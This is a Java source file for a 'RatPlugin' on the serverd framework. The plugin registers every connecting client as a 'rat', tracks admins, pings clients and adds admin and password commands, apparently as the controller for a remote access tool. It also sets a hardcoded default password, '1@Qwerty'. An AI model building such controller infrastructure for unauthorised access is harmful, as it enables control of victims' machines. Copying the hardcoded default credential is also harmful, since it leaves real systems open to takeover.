package me.wpkg.ratplugin;

import com.serverd.client.Client;
import com.serverd.plugin.Debug;
import com.serverd.plugin.Plugin;
import com.serverd.plugin.ServerdPlugin;
import com.serverd.plugin.listener.ConnectListener;

import me.wpkg.ratplugin.utils.ClientUtils;
import me.wpkg.ratplugin.commands.*;
import me.wpkg.ratplugin.utils.Utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.ArrayList;

public class RatPlugin implements ServerdPlugin, ConnectListener
{
    public ArrayList<Integer> adminsID,ratsID;
    public Pinger pinger;
    public About about;
    public String passwordHash;
    public File workspace;
    public File passwordFile;

    private static final String DEFAULT_PASSWORD = "1@Qwerty";

    @Override
    public void metadata(Plugin.Info info)
    {
        info.name = "RatPlugin";
        info.author = "rafi612";
        info.decription = "Plugin for RAT's";
        info.version = "1.0";
    }

    @Override
    public String init(Plugin plugin)
    {
        workspace = plugin.loadWorkspace();
        passwordFile = new File(workspace,"password");

        try
        {
            if (passwordFile.createNewFile())
            {
                plugin.info("Password file not exists... creating one");
                Files.write(passwordFile.toPath(),Utils.hexToBytes(Utils.sha256(DEFAULT_PASSWORD)));
            }
            passwordHash = Utils.bytesToHex(Files.readAllBytes(passwordFile.toPath()));
        }
        catch (IOException e)
        {
            return "Can't load password file: " + e.getMessage();
        }

        adminsID = new ArrayList<>();
        ratsID = new ArrayList<>();

        pinger = new Pinger(plugin,1,20000);
        about = new About(plugin);

        plugin.addConnectListener(this);
        plugin.addExecutionController(new RatController());

        plugin.addConnectListener(new AdminSessionManager());

        plugin.addCommand(new ListRats());
        plugin.addCommand(new Admin());
        plugin.addCommand(new NoPing(pinger));
        plugin.addCommand(new ConnectTime(plugin));
        plugin.addCommand(new RegisterAdmin(plugin));
        plugin.addCommand(new SetPassword());
        plugin.addCommand(about);

        return INIT_SUCCESS;
    }

    @Override
    public void work(Plugin plugin)
    {
        pinger.startPinger(plugin,this);
    }

    @Override
    public void stop(Plugin plugin)
    {
        pinger.stop();
    }

    public static void main(String[] args)
    {
        Debug.testPlugin(RatPlugin.class.getName(),false,new String[] {});
    }

    @Override
    public void onConnect(Plugin plugin, Client client)
    {
        ClientUtils.makeRat(client);
        ClientUtils.addToRatList(client,this);
    }

    @Override
    public void onDisconnect(Plugin plugin, Client client)
    {
        ClientUtils.removeFromAdminList(client,this);
        ClientUtils.removeFromRatList(client,this);
    }
}